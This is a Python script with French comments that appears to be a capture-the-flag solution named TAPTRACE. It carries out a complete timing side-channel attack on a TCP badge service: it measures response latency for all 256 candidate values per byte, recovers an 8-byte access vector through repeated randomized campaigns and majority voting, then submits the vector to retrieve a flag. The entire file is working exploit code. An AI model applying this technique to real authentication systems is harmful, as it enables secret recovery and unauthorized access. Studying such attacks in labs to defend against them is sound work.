import argparse
import socket
import random
import sys
import time
import numpy as np

WARMUP = 100
RESPONSE = b"REQUEST_PROCESSED"

BUDGETS = {
    0: 5000,
    1: 20000,
    2: 8000,
    3: 8000,
    4: 12000,
    5: 12000,
    6: 12000,
    7: 12000,
}

# Budgets reduits pour une demo rapide (--demo). Signal plus bruite,
# risque plus eleve d'erreur sur une position : pas la methodologie
# officielle, seulement une illustration en direct. Les vrais chiffres
# mesures (8/8, ~11 min) restent dans results/ et writeup/.
BUDGETS_DEMO = {
    0: 600,
    1: 2500,
    2: 1000,
    3: 1000,
    4: 1500,
    5: 1500,
    6: 1500,
    7: 1500,
}

SEEDS = {
    0: [9001, 9002, 9003],
    1: [9101, 9102, 9103],
    2: [9201, 9202, 9203],
    3: [9301, 9302, 9303],
    4: [9401, 9402, 9403],
    5: [9501, 9502, 9503],
    6: [9601, 9602, 9603],
    7: [9701, 9702, 9703],
}


OPCODE_ENROLL = 1
OPCODE_SUBMIT_FLAG = 2
FLAG_LENGTH = 42


def build_frame(badge_id, vector, opcode=OPCODE_ENROLL):
    import struct
    return struct.pack("!BI8s", opcode, badge_id, vector)


def submit_flag(host, port, badge_id, vector):
    sock = socket.create_connection((host, port))
    sock.sendall(build_frame(badge_id, bytes(vector), opcode=OPCODE_SUBMIT_FLAG))
    resp = recv_exact(sock, FLAG_LENGTH)
    sock.close()
    text = resp.decode("ascii", errors="replace")
    return text if text.startswith("TAPTRACE{") else None


def recv_exact(sock, length):
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError("connexion fermee avant reception complete")
        data += chunk
    return data


def send_and_measure(sock, frame):
    start = time.perf_counter_ns()
    sock.sendall(frame)
    resp = recv_exact(sock, len(RESPONSE))
    end = time.perf_counter_ns()
    if resp != RESPONSE:
        raise ValueError(f"response inattendue: {resp!r}")
    return end - start


def build_frames(badge_id, known_prefix):
    frames = []
    for candidate in range(256):
        vector_list = list(known_prefix) + [candidate]
        vector_list += [0x00] * (8 - len(vector_list))
        frames.append(build_frame(badge_id, bytes(vector_list)))
    return frames


def rank_by(scores):
    return sorted(range(256), key=lambda c: scores[c], reverse=True)


def show_progress(position, label, t, rounds, temps):
    # mise a jour sur une seule ligne (pas de spam dans le scroll du terminal)
    done = t + 1
    round_medians = np.median(temps[:done], axis=1, keepdims=True)
    centered_score = np.median(temps[:done] - round_medians, axis=0)
    best = int(np.argmax(centered_score))
    sys.stdout.write(
        f"\r  byte{position} [{label}] round {done}/{rounds} "
        f"— meilleur candidat provisoire : {best:02x}      "
    )
    sys.stdout.flush()


def collect(host, port, frames, seed, rounds, position=None, label=None):
    sock = socket.create_connection((host, port))
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    for i in range(WARMUP):
        send_and_measure(sock, frames[i % 256])

    temps = np.empty((rounds, 256), dtype=np.float64)
    rng = random.Random(seed)
    total_requests = WARMUP
    progress_every = max(1, rounds // 200)
    for t in range(rounds):
        order = list(range(256))
        rng.shuffle(order)
        for candidate in order:
            temps[t, candidate] = send_and_measure(sock, frames[candidate])
            total_requests += 1
        if label and (t % progress_every == 0 or t == rounds - 1):
            show_progress(position, label, t, rounds, temps)

    if label:
        sys.stdout.write("\n")
    sock.close()
    return temps, total_requests


def run_campaign(host, port, frames, seed, rounds, position=None, label=None):
    temps, total_requests = collect(host, port, frames, seed, rounds, position, label)
    round_medians = np.median(temps, axis=1, keepdims=True)
    centered = temps - round_medians
    centered_score = np.median(centered, axis=0)
    ranking = rank_by(centered_score)
    rank1 = ranking[0]
    rank2 = ranking[1]
    margin = float(centered_score[rank1] - centered_score[rank2])
    return {
        "rank1": rank1,
        "margin": margin,
        "total_requests": total_requests,
        "temps": temps,
    }


def recover_byte(host, port, badge_id, known_prefix, position, output_prefix, stats, budgets):
    rounds = budgets[position]
    seeds = SEEDS[position]
    frames = build_frames(badge_id, known_prefix)

    campaigns = []
    result_a = run_campaign(host, port, frames, seeds[0], rounds, position, "A")
    campaigns.append(("A", result_a))
    result_b = run_campaign(host, port, frames, seeds[1], rounds, position, "B")
    campaigns.append(("B", result_b))

    total_requests = result_a["total_requests"] + result_b["total_requests"]

    if result_a["rank1"] == result_b["rank1"]:
        consensus = result_a["rank1"]
        agreement = "2/2"
    else:
        result_c = run_campaign(host, port, frames, seeds[2], rounds, position, "C")
        campaigns.append(("C", result_c))
        total_requests += result_c["total_requests"]

        votes = {}
        for label, r in campaigns:
            votes[r["rank1"]] = votes.get(r["rank1"], 0) + 1
        consensus = None
        agreement = "AUCUN"
        for candidate, count in votes.items():
            if count >= 2:
                consensus = candidate
                agreement = "2/3"
                break

    for label, r in campaigns:
        if output_prefix:
            np.savez(f"{output_prefix}_byte{position}_{label}_times.npz", times=r["temps"])

    print(f"byte{position} : " + ", ".join(f"{label}=rank1={r['rank1']:02x} margin={r['margin']:.1f}" for label, r in campaigns))
    if consensus is not None:
        print(f"byte{position} -> consensus {consensus:02x} (agreement {agreement})")
    else:
        print(f"byte{position} -> INDETERMINE (aucun accord 2/3)")

    stats["positions"].append({
        "position": position,
        "consensus": consensus,
        "agreement": agreement,
        "campaigns": [(label, r["rank1"], r["margin"]) for label, r in campaigns],
        "total_requests": total_requests,
    })
    stats["total_requests"] += total_requests

    return consensus


def main():
    parser = argparse.ArgumentParser(description="TAPTRACE timing attack, aveugle (pas de canal admin)")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9000)
    parser.add_argument("--badge-id", type=int, default=1)
    parser.add_argument("--output", default=None, help="prefixe pour sauvegarder les NPZ (aucun secret ecrit)")
    parser.add_argument("--demo", action="store_true",
                         help="budgets reduits pour une demo rapide (~1-2 min au lieu de ~11 min). "
                              "Signal plus bruite, risque plus eleve d'erreur : illustratif, pas la "
                              "methodologie officielle utilisee pour les statistiques du rapport.")
    args = parser.parse_args()

    budgets = BUDGETS_DEMO if args.demo else BUDGETS

    print("TAPTRACE - attaque temporelle")
    print(f"Badge cible : {args.badge_id}")
    if args.demo:
        print("MODE DEMO : budgets reduits, resultat moins fiable que la methodologie complete")
    print()

    stats = {"positions": [], "total_requests": 0}
    start = time.time()

    known_prefix = []
    for position in range(8):
        consensus = recover_byte(args.host, args.port, args.badge_id, known_prefix, position, args.output, stats, budgets)
        if consensus is None:
            print(f"attaque arretee : byte{position} INDETERMINE, confiance insuffisante")
            break
        known_prefix.append(consensus)
        print(f"byte {position}: {consensus:02x}")

    elapsed = time.time() - start

    print()
    if len(known_prefix) == 8:
        print("Vecteur d'acces recupere :")
        print(" ".join(f"{b:02x}" for b in known_prefix))
        print()
        flag = submit_flag(args.host, args.port, args.badge_id, known_prefix)
        if flag:
            print(f"Flag obtenu : {flag}")
        else:
            print("Flag refuse : le vecteur recupere n'est pas correct")
    else:
        print(f"Attaque incomplete : {len(known_prefix)}/8 octets recuperes avant arret")
        print(" ".join(f"{b:02x}" for b in known_prefix))

    print()
    print(f"requetes : {stats['total_requests']}")
    print(f"secondes_ecoulees : {elapsed:.1f}")
    print("accords : " + ", ".join(f"byte{p['position']}={p['agreement']}" for p in stats["positions"]))


if __name__ == "__main__":
    main()
